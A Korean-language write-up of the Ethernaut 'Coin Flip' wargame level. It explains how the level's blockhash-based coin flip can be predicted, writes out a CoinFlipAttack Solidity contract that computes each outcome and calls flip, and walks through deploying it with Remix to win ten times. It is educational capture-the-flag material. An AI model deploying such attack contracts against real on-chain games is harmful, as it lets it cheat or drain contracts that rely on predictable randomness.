https://honey-push-30b.notion.site/Ethernaut-Coin-Flip-9f00991b499645638f4da14820ec2548

![Coin Flip.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/53e06193-6cf1-4e27-b724-402b71ea15b6/Coin_Flip.png)

> 
> 
> 
> 이번 문제를 해결하기 위해서는
> 
> 1. 컨트랙트의 flip 결과값을 10번 예측에 성공해야 합니다
> 
> 힌트
> 
> - 개발자 도구 콘솔에서 help() 명령어를 사용해 보세요.

코드는 아래와 같다.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins; // 성공한 횟수
  uint256 lastHash; // 이전 결과
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

# 코드 분석 및 공격 설계

이번 문제의 목적은 블록의 값을 기반으로 만든 coinFlip 값이 true인지 false인지 이지 선다를 10번 맞추는 것이 목적이다.

단순하게 찍어서 10연속 맞추는 것은 1/2^10으로 사실상 불가능하므로 코드 상에서 유추가 가능한 부분을 찾아봐야 한다. flip 함수에서 coinFlip 값을 만드는 과정을 살펴보면 다음과 같은 과정을 거친다.

```solidity
uint256 blockValue = uint256(blockhash(block.number.sub(1)));
// 변수 blockValue에 (블록 숫자-1)값을 blockhash로 해싱한 값으로 넣어준다.
uint256 coinFlip = blockValue.div(FACTOR);
// coinFlip 값은 이 blockValue를 FACTOR로 나눈 값이다.
bool side = coinFlip == 1 ? true : false;
// 이 coinFlip 값이 1이면 true 1이 아니면 false이다.

```

즉 side 값을 예측 해야하는데 필요한 것은 두가지다.

1. blockhash함수를 사용할 수 있고 
2. 블록 숫자만 알면 된다.

그러고 나면 FACTOR값은 고정값이므로 coinFlip의 결과를 유추할 수 있다. 

blockhash함수는 solidity 내장함수이므로 solidity로 코드를 짜면 사용할 수 있다. 그러면 블록 숫자는 어떻게 알 수 있을까?

개발자 도구 콘솔에서 help()명령어를 쳐보면 사용할 수 있는 함수를 볼 수 있다.

| (index) | Value |
| --- | --- |
| player | 'current player address' |
| ethernaut | 'main game contract' |
| level | 'current level contract address' |
| contract | 'current level contract instance (if created)' |
| instance | 'current level instance contract address (if created)' |
| version | 'current game version' |
| getBalance(address) | 'gets balance of address in ether' |
| getBlockNumber() | 'gets current network block number' |
| sendTransaction({options}) | 'send transaction util' |
| getNetworkId() | 'get ethereum network id' |
| toWei(ether) | 'convert ether units to wei' |
| fromWei(wei) | 'convert wei units to ether' |

getBlockNumber 가 보인다. 현재 네트워크의 블록 값을 가져올 수 있으므로 한번 해보자.

![4시쯤.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/94f650ed-2d7a-4ac8-8ad0-7f7447a9fb3d/4%EC%8B%9C%EC%AF%A4.png)

근데 이 블록 숫자는 시간이 지날수록 변동이 된다. 왜냐면 지금 사용하고 있는 네트워크(Rinkeby)는 계속해서 트랜잭션이 일어나서 블록이 추가되기 때문이다. 실제로 위의 사진은 오후4시경 await getBlockNumber()를 통해 블록 숫자를 알아낸 것으로 11446183이 나온다. 

 

![10시쯤.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/492a68f6-97a5-4da0-b732-cc5c7470b5a9/10%EC%8B%9C%EC%AF%A4.png)

밤 10시쯤 await getBlockNumber()를 통해 블록 숫자를 알아본 것으로 11447851이 되어 블록 숫자가 늘어난 것을 알 수 있다.

따라서 블록 숫자는 변동이 되는데 CoinFlip 컨트랙트에서 난수를 만드는데 사용한 블록 숫자는 어떻게 예측을 할 수 있을까? 이를 위해서는 EOA(External Owned account)와 CA(Contract Account)를 잠깐 짚고넘어가자.

### EOA(External Owned Account)와 CA(Contract Account)

EOA(External Owned Account)는 공개 이더리움 주소와 개인키 조합을 의미하는데 쉽게 말해 지갑 주소라고 보면 된다. 이것을 이용하여 다른 계정과 이더리움을 송수신하고 스마트 컨트랙트에 트랜잭션을 보낼 수 있다. 메타마스크, 카이카스와 같은 지갑에서 만든 계정이 EOA다.

CA(Contract Account)는 컨트랙트 계정을 의미하는데 외부 소유 계정과 다르게 개인키가 존재하지 않고, 스마트 컨트랙트를 블록체인에 배포할 때 생성된다. 컨트랙트 계정 대신 컨트랙트로만 표시하기도 한다.

이 컨트랙트 계정은 다른 계정과 이더를 송수신하는 기능을 하며, 이것은 EOA와 동일하다. 또 이 컨트랙트 계정에는 코드를 담고 있는데 흔히 스마트 컨트랙트라고 한다. EOA나 다른 컨트랙트의 호출을 받아서 트랜잭션을 발생시키며, 스스로 동작하지는 않는다.스마트 컨트랙트에 접근하기 위한 주소가 곧 컨트랙트 계정을 의미한다.

다시 돌아와서 우리가 가지고 있는 일반적인 지갑(External owned account)주소로는 이 네트워크에 요청을 보내서 그 당시에 블록 숫자를 알아낸다 하더라도 실제 coinFlip 컨트랙트의 flip함수가 실행될 때 네트워크의 블록 숫자를 알아내기는 쉽지가 않다.

반면 컨트랙트 코드에 의한 컨트랙트 주소(Contract Account)로 flip 함수를 실행시킨다면 하나의 트랜잭션으로 실행시키는 것이므로 내 컨트랙트 코드 실행 시의 네트워크 블록 숫자와 flip 함수가 실행될 때 블록 숫자는 같다. 

즉 하나의 트랜잭션에서 side값을 예측하고 이 값을 파라미터로 coinFlip 컨트랙트 인스턴스의 flip 함수를 호출하면 된다. 이를 위해서는 우리가 컨트랙트 코드를 통해서 coinFlip 컨트랙트 인스턴스의 flip 함수를 실행해야 하므로 코드를 작성해야 한다. 

# 공격

따라서 Remix IDE(웹 기반 솔리디티 개발 도구)를 통해서 공격해보자.

![리믹스 폴더.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/cddab4d9-5a08-46bf-a13b-b1b9a5bc4a64/%EB%A6%AC%EB%AF%B9%EC%8A%A4_%ED%8F%B4%EB%8D%94.png)

처음 들어가면 contracts 폴더의 articats에 온갖 컨트랙트가 있는데 다 지우고 CoinFlipAttack.sol 를 만들어줬다.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/6be0b410dcb77bc046cd3c960b4170368c502162/contracts/math/SafeMath.sol';

contract CoinFlip {
  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  constructor() public {
    consecutiveWins = 0;
  }
  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    if (lastHash == blockValue) {
      revert();
    }
    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

먼저 문제 컨트랙트의 솔리디티 코드를 복사해서 가져온다. 그래야 컨트랙트 내에서 이 CoinFlip 컨트랙트(클래스)로 인스턴스를 받을 수 있기 때문이다.

이 때 import를 주의해야 하는데  문제 컨트랙트에서는 SafeMath를 사용하다보니 이를 import 해야한다. 근데 문제 컨트랙트에서는 상대주소로 되어있어서 우리가 그대로 가져오면 SafeMath 를 import할 수 없으므로 절대 경로로 바꿔 줘야한다.

그러면 이제 공격 컨트랙트를 이어서 작성해주면 된다.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/6be0b410dcb77bc046cd3c960b4170368c502162/contracts/math/SafeMath.sol';

contract CoinFlip {
  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  constructor() public {
    consecutiveWins = 0;
  }
  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    if (lastHash == blockValue) {
      revert();
    }
    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

contract CoinFlipAttack {
  using SafeMath for uint256;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip public coinflip;
  bool guess;
  constructor(address _coinflipaddr) public {
    coinflip = CoinFlip(_coinflipaddr); 
  }

  function attack() public returns (bool) {

      uint256 blockValue = uint256(blockhash(block.number.sub(1)));
      uint256 coinFlip = blockValue.div(FACTOR);
      guess = coinFlip == 1 ? true : false;   

      coinflip.flip(guess);
      
    } 
  }
```

CoinFlipAttack 컨트랙트가 공격을 위해 작성한 컨트랙트다. 

1. FACOTR값은 고정값이므로 그대로 가져왔다.
2. CoinFlip 컨트랙트를 받을 coinflip을 선언한다.(문제의 CoinFlip 컨트랙트의 인스턴스 주소를 넣어 줄 것)
3. guess는 우리가 CoinFlip 인스턴스로 보낼 예측 값이다.

먼저 constructor(생성자)를 통해서 이 컨트랙트가 생성될 때 coinflip 변수에 문제의 CoinFlip 인스턴스 주소를 담는다. 이제 이 컨트랙트에서는 문제의 CoinFlip 인스턴스의 함수 flip을 실행시킬 수 있게 된다. 왜냐하면 flip함수는 public으로 되어있기 때문이다.

attack() 함수는 본격적으로 공격이 진행되는 함수다.

1. 블록 숫자가 문제의 CoinFlip 인스턴스가 실행될 때와 같으므로 이 컨트랙트에서도 그대로 block값에서 1을 뺀 후 blockhash를 통한 결과값을 변수 blockValue에 담는다.
2. blockValue값을 FACTOR(고정값)으로 나눈 결과를 변수 coinFlip 에 담는다.
3. 이 값이 1이면 true, 다르면 false를 guess에 담는다.

CoinFlip 컨트랙트와 같은 과정을 거쳐서 결과 값(guess)를 생성하였기에 이 결과 값은 문제의 CoinFlip 인스턴스와 같은 결과다.

따라서 coinflip.flip(guess)를 통해 예측한 값을 문제 인스턴스의 함수로 실행하게 되면 예측이 성공하게 될 것이다.

먼저 공격을 실행하기 전에 구성해야 할 것이 있다.

![컴파일.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/729a9bbb-f8b7-459d-8eb2-feba7f9287f0/%EC%BB%B4%ED%8C%8C%EC%9D%BC.png)

솔리디티 코드를 0.6.0버전으로 짰기 때문에 솔리디티 버전을 0.6.0으로 맞춰주어야 한다. 그리고 컴파일을 해주자.

![Injected Environment.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/31e544d4-4777-42c5-9d57-7d1b171b93df/Injected_Environment.png)

또한 배포 전 우리는 문제와 같은 네트워크에서 이 컨트랙트 코드를 실행해야 하므로 Environment를 Injected Provider - MetaMask로 설정하여 문제의 네트워크인 Rinkeby network로 설정해준다.

그리고 이 솔리디티 코드에서는 컨트랙트가 두개이므로(CoinFlip, CoinFlipAttack) 공격을 위한 컨트랙트인 CoinFlipAttack로 지정해준다.

![컨트랙트.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/02e7129e-ce84-4033-be6d-44e0391f1419/%EC%BB%A8%ED%8A%B8%EB%9E%99%ED%8A%B8.png)

컨트랙트를 CoinFlipAttack으로 설정해주면 Deploy를 위해서 coinflipaddr에 들어갈 값을 넣어달라고 한다. 그 이유는 생성자로 coinflipaddr을 받기 때문에 이 컨트랙트를 deploy하기 위해서는 constructor에서 매개변수로 받기로 한 coinflipaddr이 필요하기 때문이다.

이 값으로는 문제의 CoinFlip 컨트랙트의 인스턴스 주소를 넣어주어서 CoinFlip 컨트랙트 인스턴스에 접근할 수 있게 해준다. 

![인스턴스 주소.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d3300a83-c0e6-4923-8678-a1d12d51b577/%EC%9D%B8%EC%8A%A4%ED%84%B4%EC%8A%A4_%EC%A3%BC%EC%86%8C.png)

개발자 도구에서 인스턴스 주소를 확인하면 0x18cb710EE1657E7A180f15D8909F1D278e9427D2 이므로 이 값을 넣어준후 deploy 해준다.

![deploy.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/aee03e04-29ec-4c17-8a51-a464501ee63b/deploy.png)

deploy 후 메타마스크에서 확인을 통해 트랜잭션을 허용해준다. 참고로 이 때 체크표시가 되어있는 Publish to IPFS는 체크 해제 표시 해주었다.

![deploy contract.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/61b858cc-bd56-493a-be45-afb39a5ec1d4/deploy_contract.png)

이제 하단의 Deployed Contracts에 컨트랙트가 생긴 것을 볼 수 있다. 화살표를 눌러서 펼쳐주면

![공격시작.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/48b9ffd7-e409-4383-b802-49e2a079ee66/%EA%B3%B5%EA%B2%A9%EC%8B%9C%EC%9E%91.png)

attack함수를 실행시킬 수 있다. 이제 attack 함수를 누르면 컨트랙트에서 예측한 결과값을 문제 인스턴스로 보내어 예측을 성공할 것이다.

![실행전.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/70276c73-2da8-4f62-a17f-135faaf64503/%EC%8B%A4%ED%96%89%EC%A0%84.png)

먼저 공격을 하기전 contract의 consecutiveWins값을 확인해 본다. words를 살펴보면 [0,empty]로 되어있는데 여기서 0값이 성공 횟수이다. 아직 실행을 안했기 때문에 0번임을 볼 수 있다.

![공격1.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f4f7f045-5b3b-4315-aa47-64a509fd8dd0/%EA%B3%B5%EA%B2%A91.png)

이제 attack을 눌러서 attack 함수를 실행해주면 트랜잭션을 발생시키므로 트랜잭션을 허용해 줘야한다.

![트랜잭션 컨펌.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fb4263f9-f4a7-4b02-aed1-0a7d4371803b/%ED%8A%B8%EB%9E%9C%EC%9E%AD%EC%85%98_%EC%BB%A8%ED%8E%8C.png)

그리고 트랜잭션이 컨펌되고 나면 초록색 체크표시가 뜬다. 이제 ConsecutiveWins가 늘었는지 다시 개발자 도구 콘솔에서 확인해보자.

![공격1.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c3388d1a-f3a2-4910-bc2c-f300a55ed829/%EA%B3%B5%EA%B2%A91.png)

정상적으로 words의 첫번째 값이 1로 늘어난 것을 볼 수 있다. 즉 예측에 성공했다는 뜻이다. 이제 이 값이 10이 될때까지 attack을 계속 눌러주면 된다.

![완성.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2ec91832-b9d8-4fca-b59f-5b934656984f/%EC%99%84%EC%84%B1.png)

 

![이더넛 페이지.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6bf956b4-d7c4-4ec0-869d-69ca71a71996/%EC%9D%B4%EB%8D%94%EB%84%9B_%ED%8E%98%EC%9D%B4%EC%A7%80.png)

이제 10이 되었으므로 Ethernaut 페이지로 돌아가서 submit instance를 통해 제출해주고 트랜잭션을 허용해준다.

![성공.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/47c9c3b1-1269-4d68-9c91-95764cea56f5/%EC%84%B1%EA%B3%B5.png)

Coin Flip 문제를 해결하는데 성공했다.
